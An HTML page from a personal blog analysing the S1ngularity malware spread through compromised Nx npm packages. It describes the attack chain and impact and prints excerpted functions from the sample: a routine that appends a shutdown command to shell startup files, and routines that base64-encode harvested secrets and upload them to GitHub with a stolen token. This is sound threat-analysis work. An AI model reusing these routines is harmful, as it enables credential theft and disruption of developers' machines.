@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>S1ngularity Malware :: Tane H. Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="An in-depth analysis of the S1ngularity malware, its Nx supply-chain attack vector, compromise method, impact, and threat intelligence context." />
+<meta name="keywords" content="s1ngularity, Nx supply-chain attack, Node.js malware, GitHub exfiltration, threat intelligence" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="http://localhost:1313/posts/s1ngularity/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/code.min.4f0ccc8439f99bf7f7970298556b94011aabc1fcae743b6842fc3361a2da9ea3.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/main.min.0d12b8a9265a42249441897689c32a563681810743034d1ccc39ffd3d71f9780.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/menu.min.310d32205bdedd6f43144e3c3273c9deecd238eba5f9108db5ea96ca0cfbe377.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/post.min.ad50c7f4d00e7975918f37fc74c6029e1959a40d66fb5b2c6564a8715e985573.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/syntax.min.e9ab635cf918bc84b901eb65c0b2caa74c9544245e3647c1af5c129896ef276e.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="http://localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+
+
+
+
+
+<link rel="shortcut icon" href="http://localhost:1313/favicon.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="S1ngularity Malware">
+<meta property="og:description" content="An in-depth analysis of the S1ngularity malware, its Nx supply-chain attack vector, compromise method, impact, and threat intelligence context." />
+<meta property="og:url" content="http://localhost:1313/posts/s1ngularity/" />
+<meta property="og:site_name" content="Tane H. Blog" />
+
+  
+  
+  <meta property="og:image" content="http://localhost:1313/">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2025-09-05 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container center">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Tane Haines
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About Me</a></li>
+        
+      
+        
+          <li><a href="/posts">Blog Post</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about" >About Me</a></li>
+        
+      
+        
+          <li><a href="/posts" >Blog Post</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="http://localhost:1313/posts/s1ngularity/">S1ngularity Malware</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2025-09-05</time><span class="post-author">Tane Haines</span><span class="post-reading-time">7 min read (1369 words)</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="http://localhost:1313/tags/malware/">malware</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/nodejs/">nodejs</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/supply-chain/">supply-chain</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/nx/">nx</a>&nbsp;
+      
+      #<a href="http://localhost:1313/tags/threat-intelligence/">threat-intelligence</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>I found out about the malware called S1ngularity. This is my writeup on it.</p>
+<h1 id="analyzing-the-s1ngularity-malware">Analyzing the <em>s1ngularity</em> Malware<a href="#analyzing-the-s1ngularity-malware" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>So recently, I examined a Node.js–based malware sample called <strong><code>s1ngularity</code></strong>, which showcases how attackers can abuse JavaScript tooling ecosystems to steal secrets and dump them anonymously.</p>
+<p>The <strong>S1ngularity</strong> malware is a Node.js–based threat that demonstrates how supply-chain attacks can compromise developers’ machines, steal secrets, and exfiltrate data via legitimate platforms.</p>
+<p><code>s1ngularity</code> executes on UNIX-like systems and deliberately exits on Windows hosts.</p>
+<hr>
+<h2 id="non-technical-overview">Non-Technical Overview<a href="#non-technical-overview" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>In late August 2025, a widely-used software tool for developers called <strong>Nx</strong> was briefly compromised in what is known as a <strong>supply-chain attack</strong>. Instead of directly attacking users, the perpetrators managed to publish malicious versions of Nx that could secretly steal sensitive information from the computers of developers who installed them.</p>
+<p>The malware, named <strong>S1ngularity</strong>, targeted computers running Linux or macOS, looking for private keys, wallet files, and access tokens—information that could allow attackers to access online accounts, cryptocurrency wallets, or software repositories. It could also disrupt users by forcing their computers to shut down automatically.</p>
+<p>Nx maintainers responded quickly. Within hours, the malicious packages were removed, publishing tokens were revoked, and guidance was issued to help developers clean their systems. Despite the rapid response, the attack affected thousands of developers worldwide and demonstrated how even trusted software tools can be used as a vector to compromise sensitive data.</p>
+<p><strong>Key Points:</strong></p>
+<ul>
+<li>Attackers used the <strong>trust in Nx packages</strong> to reach developers.</li>
+<li>Malware exfiltrated data silently to public repositories.</li>
+<li>Developers and organizations had to rotate credentials and audit systems to recover.</li>
+<li>The incident highlights the importance of <strong>supply-chain security</strong> and monitoring of software dependencies.</li>
+</ul>
+<hr>
+<h2 id="how-the-malware-spread-nx-supply-chain-attack">How the Malware Spread: Nx Supply-Chain Attack<a href="#how-the-malware-spread-nx-supply-chain-attack" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>The initial infection vector was a <strong>compromise of the Nx JavaScript/TypeScript tooling ecosystem</strong>:</p>
+<ul>
+<li>Attackers some how obtained a publishing token for the npm account used by Nx maintainers. The method and date are unknown as of current.</li>
+<li>Attackers published <strong>malicious versions of <code>nx</code> and <code>@nx/*</code> packages</strong> to the npm registry on August 26–27, 2025.</li>
+<li>These packages executed <strong>post-install scripts</strong> that scanned developer machines and CI environments for sensitive files, tokens, and configuration secrets.</li>
+<li>Because Nx is widely used in <strong>monorepos and CI/CD pipelines</strong>, automated installs during this window could trigger the malware.</li>
+<li>This method is a classic <strong>supply-chain attack</strong>, where the threat spreads through trusted software dependencies rather than direct phishing or malware downloads.</li>
+</ul>
+<hr>
+<h2 id="how-nx-was-compromised">How Nx Was Compromised<a href="#how-nx-was-compromised" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>GitHub advisory comments and investigations revealed the mechanism:</p>
+<ul>
+<li>Attackers obtained a token that allowed them to publish packages, even though maintainers had 2FA enabled. npm did not enforce 2FA for publishing at the time.</li>
+<li>The attackers pushed multiple poisoned builds over a short period.</li>
+<li>Luckily Nx maintainers coordinated with npm and security teams to remove malicious packages, rotate credentials, and publish guidance for affected users.</li>
+</ul>
+<p>The malware targeted Linux/macOS environments, performing reconnaissance, harvesting wallet files and private keys, and using any available GitHub token to <strong>create public repositories (<code>s1ngularity-repository</code>)</strong> for exfiltrating stolen data.</p>
+<hr>
+<h2 id="the-script">The Script<a href="#the-script" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>The script was basic. Below is the Technical Overview</p>
+<h3 id="malicious-actions">Malicious Actions<a href="#malicious-actions" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<ul>
+<li>
+<p><strong>Wallet/Key Harvesting</strong><br>
+Recursively searches sensitive directories (<code>$HOME</code>, <code>.config</code>, <code>.local/share</code>, <code>.ethereum</code>, <code>.electrum</code>, <code>/etc</code>, <code>/tmp</code>) for:</p>
+<ul>
+<li>Keystores (<code>UTC--</code>, <code>keystore.json</code>)</li>
+<li>Cryptocurrency wallets (Metamask, Electrum, Ledger, Trezor, Exodus, Phantom, Solflare, Trust Wallet)</li>
+<li>Private keys (<code>id_rsa</code>, <code>.secret</code>, <code>secrets.json</code>)</li>
+<li>Environment files (<code>.env</code>)</li>
+</ul>
+</li>
+<li>
+<p><strong>System Reconnaissance</strong><br>
+Collects system details:</p>
+<ul>
+<li>Hostname, platform, OS type/release</li>
+<li>Environment variables</li>
+<li>Installed CLI tools (<code>claude</code>, <code>gemini</code>, <code>q</code>)</li>
+<li>GitHub CLI tokens</li>
+<li>NPM account info (<code>npm whoami</code> and <code>.npmrc</code> content)</li>
+</ul>
+</li>
+<li>
+<p><strong>Persistence &amp; Disruption</strong><br>
+Appends:</p>
+<pre><code>sudo shutdown -h 0
+</code></pre>
+<p>to shell initialization files (<code>.bashrc</code>, <code>.zshrc</code>), forcing the system to shut down on login.</p>
+</li>
+<li>
+<p><strong>Data Exfiltration</strong></p>
+<ul>
+<li>Files are <strong>Base64-encoded</strong> into <code>/tmp/inventory.txt</code>.</li>
+<li>If a <strong>GitHub token</strong> is found, the malware creates a public repository named <code>s1ngularity-repository</code> and uploads the stolen data as <code>results.b64</code>.</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="core-functions">Core Functions<a href="#core-functions" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li><code>isOnPathSync(cmd)</code> → Detects installed CLI tools</li>
+</ul>
+<pre tabindex="0"><code>// Action based on OS.
+function isOnPathSync(cmd) {
+  const whichCmd = process.platform === &#39;win32&#39; ? &#39;where&#39; : &#39;which&#39;;
+  try {
+    const r = spawnSync(whichCmd, [cmd], { stdio: [&#39;ignore&#39;, &#39;pipe&#39;, &#39;ignore&#39;] });
+    return r.status === 0 &amp;&amp; r.stdout &amp;&amp; r.stdout.toString().trim().length &gt; 0;
+  } catch {
+    return false;
+  }
+}
+</code></pre><ul>
+<li><code>runBackgroundSync(cmd, args)</code> → Executes background commands and captures output</li>
+</ul>
+<pre tabindex="0"><code>// Sync with background.
+function runBackgroundSync(cmd, args, maxBytes = 200000, timeout = 200000) {
+  try {
+    const r = spawnSync(cmd, args, { encoding: &#39;utf8&#39;, stdio: [&#39;ignore&#39;, &#39;pipe&#39;, &#39;pipe&#39;], timeout });
+    const out = (r.stdout || &#39;&#39;) + (r.stderr || &#39;&#39;);
+    return { exitCode: r.status, signal: r.signal, output: out.slice(0, maxBytes) };
+  } catch (err) {
+    return { error: String(err) };
+  }
+}
+</code></pre><ul>
+<li><code>forceAppendAgentLine()</code> → Appends shutdown command for persistence</li>
+</ul>
+<pre tabindex="0"><code>// Force file to shutdown on login. (Only for user account being used).
+function forceAppendAgentLine() {
+  const home = process.env.HOME || os.homedir();
+  const files = [&#39;.bashrc&#39;, &#39;.zshrc&#39;];
+  const line = &#39;sudo shutdown -h 0&#39;;
+  for (const f of files) {
+    const p = path.join(home, f);
+    try {
+      const prefix = fs.existsSync(p) ? &#39;\n&#39; : &#39;&#39;;
+      fs.appendFileSync(p, prefix + line + &#39;\n&#39;, { encoding: &#39;utf8&#39; });
+      result.appendedFiles.push(p);
+    } catch (e) {
+      result.appendedFiles.push({ path: p, error: String(e) });
+    }
+  }
+}
+</code></pre><ul>
+<li><code>githubRequest(pathname, method, body, token)</code> → Handles GitHub API requests for repo creation/data upload</li>
+</ul>
+<pre tabindex="0"><code>// Sends a request to github to upload some content for a local git repository.
+function githubRequest(pathname, method, body, token) {
+  return new Promise((resolve, reject) =&gt; {
+    const b = body ? (typeof body === &#39;string&#39; ? body : JSON.stringify(body)) : null;
+    const opts = {
+      hostname: &#39;api.github.com&#39;,
+      path: pathname,
+      method,
+      headers: Object.assign({
+        &#39;Accept&#39;: &#39;application/vnd.github.v3+json&#39;,
+        &#39;User-Agent&#39;: &#39;axios/1.4.0&#39;
+      }, token ? { &#39;Authorization&#39;: `Token ${token}` } : {})
+    };
+    if (b) {
+      opts.headers[&#39;Content-Type&#39;] = &#39;application/json&#39;;
+      opts.headers[&#39;Content-Length&#39;] = Buffer.byteLength(b);
+    }
+    const req = https.request(opts, (res) =&gt; {
+      let data = &#39;&#39;;
+      res.setEncoding(&#39;utf8&#39;);
+      res.on(&#39;data&#39;, (c) =&gt; (data += c));
+      res.on(&#39;end&#39;, () =&gt; {
+        const status = res.statusCode;
+        let parsed = null;
+        try { parsed = JSON.parse(data || &#39;{}&#39;); } catch (e) { parsed = data; }
+        if (status &gt;= 200 &amp;&amp; status &lt; 300) resolve({ status, body: parsed });
+        else reject({ status, body: parsed });
+      });
+    });
+    req.on(&#39;error&#39;, (e) =&gt; reject(e));
+    if (b) req.write(b);
+    req.end();
+  });
+}
+</code></pre><ul>
+<li><code>processFile(listPath)</code> → Reads inventory, Base64-encodes file contents, and stages them for exfiltration</li>
+</ul>
+<pre tabindex="0"><code>  // Read /tmp/inventory.txt, get file contents, and return it in b64.
+  async function processFile(listPath = &#39;/tmp/inventory.txt&#39;) {
+    const out = [];
+    let data;
+    try {
+      data = await fs.promises.readFile(listPath, &#39;utf8&#39;);
+    } catch (e) {
+      return out;
+    }
+    const lines = data.split(/\r?\n/);
+    for (const rawLine of lines) {
+      const line = rawLine.trim();
+      if (!line) continue;
+      try {
+        const stat = await fs.promises.stat(line);
+        if (!stat.isFile()) continue;
+      } catch {
+        continue;
+      }
+      try {
+        const buf = await fs.promises.readFile(line);
+        out.push(buf.toString(&#39;base64&#39;));
+      } catch { }
+    }
+    return out;
+  }
+</code></pre><hr>
+<h2 id="impact-of-the-attack">Impact of the Attack<a href="#impact-of-the-attack" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li><strong>Secrets compromised</strong>: Thousands of items including GitHub tokens (~1,000+), SSH keys, wallet files, <code>.env</code> files, and NPM credentials.</li>
+<li><strong>Wide reach</strong>: Hundreds of developers/organizations initially identified, expanding to thousands of repositories and hundreds of GitHub accounts.</li>
+<li><strong>High-value targeting</strong>: Wallets, SSH keys, and developer tokens were primary targets.</li>
+<li><strong>Stealth exfiltration</strong>: Using victims’ GitHub accounts reduced detection risk.</li>
+<li><strong>CI/CD contamination</strong>: Malware could execute in automated pipelines, amplifying potential impact.</li>
+</ul>
+<hr>
+<h2 id="threat-level--threat-intelligence-context">Threat Level &amp; Threat Intelligence Context<a href="#threat-level--threat-intelligence-context" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>On a <strong>threat scale</strong>, S1ngularity sits at a <strong>hig impact level</strong> due to:</p>
+<ol>
+<li><strong>Supply-chain leverage</strong>: It compromises trusted developer tooling that many organizations automatically install.</li>
+<li><strong>Silent exfiltration</strong>: Data is sent through legitimate channels (GitHub), bypassing many conventional security monitoring systems.</li>
+<li><strong>Persistence &amp; disruption</strong>: Forced shutdowns and credential harvesting amplify operational and security risks.</li>
+<li><strong>Target specificity</strong>: Focuses on developers and crypto users, which are high-value targets for attackers.</li>
+<li><strong>Attack difficulty</strong>: Moderate — requires access to a publishing token, but the payload itself is simple Node.js and does not rely on advanced exploits.</li>
+</ol>
+<p>From a <strong>threat intelligence perspective</strong>:</p>
+<ul>
+<li>Security teams should monitor <strong>npm ecosystems</strong> for anomalous package versions or unexpected releases.</li>
+<li>Organizations should integrate <strong>CI/CD secret scanning</strong>, track <strong>public GitHub repository creation</strong>, and audit <strong>developer token usage</strong>.</li>
+<li>Monitoring for <strong>supply-chain compromises</strong> in widely-used developer tools is critical, as attacks like S1ngularity can have cascading effects across organizations.</li>
+<li>Intelligence sharing among security vendors and developer communities is essential to rapidly detect and mitigate similar attacks.</li>
+</ul>
+<hr>
+<h2 id="conclusion">Conclusion<a href="#conclusion" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>The <em>s1ngularity</em> malware demonstrates how a Node.js script can:</p>
+<ol>
+<li>Exploit trusted developer tooling (Nx supply-chain)</li>
+<li>Compromise sensitive credentials via a stolen publishing token</li>
+<li>Exfiltrate data silently to GitHub</li>
+<li>Force persistence and disruption through login shutdowns</li>
+</ol>
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+    
+    
+      <a href="http://localhost:1313/posts/blockciphers/" class="button inline next">
+         [<span class="button__text">Block Ciphers - Part 1</span>] &gt;
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+<div class="footer__rss">
+  <a href="/index.xml" title="Subscribe to RSS Feed" target="_blank">
+    <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
+      <path d="M2.002 2.002a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2h-8a2 2 0 0 1-2-2v-8zm1.5 0a.5.5 0 0 0-.5.5v8a.5.5 0 0 0 .5.5h8a.5.5 0 0 0 .5-.5v-8a.5.5 0 0 0-.5-.5h-8z"/>
+      <path d="M4.5 6a1.5 1.5 0 1 1 0-3 1.5 1.5 0 0 1 0 3zm0 1a2.5 2.5 0 1 0 0-5 2.5 2.5 0 0 0 0 5z"/>
+      <path d="M4.5 10a1.5 1.5 0 1 1 0-3 1.5 1.5 0 0 1 0 3zm0 1a2.5 2.5 0 1 0 0-5 2.5 2.5 0 0 0 0 5z"/>
+      <path d="M4.5 14a1.5 1.5 0 1 1 0-3 1.5 1.5 0 0 1 0 3zm0 1a2.5 2.5 0 1 0 0-5 2.5 2.5 0 0 0 0 5z"/>
+    </svg>
+    RSS Feed
+  </a>
+</div>
+
+<style>
+.footer__rss {
+  margin-top: 1rem;
+  text-align: center;
+}
+
+.footer__rss a {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.5rem;
+  color: var(--accent);
+  text-decoration: none;
+  font-size: 0.9rem;
+  padding: 0.5rem 1rem;
+  border: 1px solid var(--accent);
+  border-radius: 4px;
+  transition: all 0.2s ease;
+}
+
+.footer__rss a:hover {
+  background-color: var(--accent);
+  color: var(--bg);
+}
+
+.footer__rss svg {
+  width: 16px;
+  height: 16px;
+}
+</style>
+
+
+  
+</div>
+
+</body>
+</html>
